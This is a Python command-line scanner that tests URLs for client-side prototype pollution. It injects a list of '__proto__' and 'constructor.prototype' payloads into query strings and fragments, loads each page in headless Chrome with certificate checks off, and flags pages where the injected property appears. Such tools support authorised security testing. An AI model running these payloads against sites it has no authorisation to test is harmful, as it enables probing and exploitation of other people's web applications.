import asyncio
from urllib import parse
from pyppeteer import launch
import pyppeteer
from colorama import *
import sys
import string
import random
from urllib import parse
import argparse
import time


init() 
GREEN   = Fore.GREEN
RED     = Fore.RED
RESET   = Fore.RESET
BLUE    = Fore.BLUE
YELLOW  = Fore.YELLOW
MAGENTA = Fore.MAGENTA

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" # Why not

payloads = [
    "__proto__[property]=value",
    "__proto__.property.=value",
    "__proto__.property.__proto__.property.=value",
    "[constructor][prototype][property]=value",
    "constructor.prototype.property=value",
    "constructor[prototype][property]=value",
    "constructor[prototype].property=value",
    "constructor.prototype.[property]=value",
    "{\"__proto__\": {\"property\": \"value\"}}",
]



def rand_str(n):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(n))


def has_param(url):
    parsed_url = parse.urlparse(url)
    return parsed_url.query != ""

def qs_replace(url, val):
    root, query = url.split('?')
    qs_dict = {}
    for pair in query.split('&'):
        pair = pair.split("=")
        qs_dict[pair[0]] = "placeholder"
    qs = ""
    for k,v in qs_dict.items():
        qs += k + "="+ val 
        qs += "&"
    return root + "?" + qs[:-1]


prop = rand_str(10)
val = rand_str(10)

args = None

async def close_dialog(dialog):
    sys.stdout.write(f"{MAGENTA}[!] A dialog received: \"{dialog.message}\" {RESET}\n")
    await dialog.dismiss()
    return

async def do_req(browser, url, payload, semaphore,output_file):
    async with semaphore:

        payload = payload.replace("property",prop)
        payload = payload.replace("value",val)

        if has_param(url) and (args.keyword in url):
            url = url.replace(args.keyword,payload)
        elif has_param(url):
            url = qs_replace(url,payload)
            url = url + "&" + payload
        else:
            url += payload

        new_tab = None # scope thing
        try:

            new_tab = await browser.newPage()
            new_tab.on('dialog', lambda dialog: asyncio.ensure_future(close_dialog(dialog)))
            await new_tab.setUserAgent(user_agent); # not needed but why not

            # when there are no more than 0 network connections for at least 500 ms
            await new_tab.goto(url, {'waitUntil': 'networkidle0'})
            # open new tab so we can achieve concurrency completely


            pollution = await new_tab.evaluate(prop)
            if pollution == val:
                output_file.write(f"[*] Vulnerable, {url}\n")
                sys.stdout.write(f"{GREEN}[*] Vulnerable, {url} \n{RESET}")    

            await new_tab.close()

        except pyppeteer.errors.ElementHandleError:
            output_file.write(f"[!] Not vulnerable, {url} \n")
            sys.stdout.write(f"{RED}[!] Not vulnerable, {url} \n{RESET}")    
            await new_tab.close()

        except:
            sys.stdout.write(f"{RED}[!] Something went wrong when performing, {url} \n{RESET}")    
            output_file.write(f"[!] Something went wrong when performing, {url} \n")    
            await new_tab.close()
    return


async def main(urls):
    semaphore= asyncio.Semaphore(args.concurrency)
    tasks = []

    output_file = open(args.output,"w")

    # one browser multiple tags
    browser = await launch({
        "ignoreHTTPSErrors": True,
        "args": ["--ignore-certificate-errors","--no-sandbox"],
        "headless" : not args.debug
    })


    for url in urls:
        for payload in payloads:
            if has_param(url):
                tasks.append(do_req(browser,url,payload,semaphore,output_file))
            else:
                # it looks ugly but idc
                for i in ["?","#"]:
                    tasks.append(do_req(browser,url+i,payload,semaphore,output_file))
    
    await asyncio.wait(tasks)
    #time.sleep(10000)

    output_file.close()
    await browser.close()



if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", dest="list",help="List of urls")
    parser.add_argument("-u", "--url", dest="url",help="Single url")
    parser.add_argument("-c", "--concurrency", dest="concurrency",type=int,help="Concurrency", default=10)
    parser.add_argument("-d", "--debug", dest="debug", help="Starts chrome without being headless", action="store_true", default=False)
    parser.add_argument("-f", "--fuzz-keyword", dest="keyword", help="Fuzzes the keyword, ex: -f BUZZ", default="FUZZ")
    parser.add_argument("-o", "--output", dest="output", help="Output file, ex: -o foo.txt")


    args = parser.parse_args()
    if (len(sys.argv) < 2) and (sys.stdin.isatty() == True):
        parser.print_usage()
        sys.exit(0)
    

    urls = []
    if args.url:
        # single url is supplied
        urls.append(args.url)
    else:
        if sys.stdin.isatty():
            f = open(args.list,"r")
            for url in f:
                urls.append(url.replace("\n",""))
        else:
            for url in sys.stdin:
                urls.append(url.replace("\n",""))
            
    asyncio.get_event_loop().run_until_complete(main(urls))

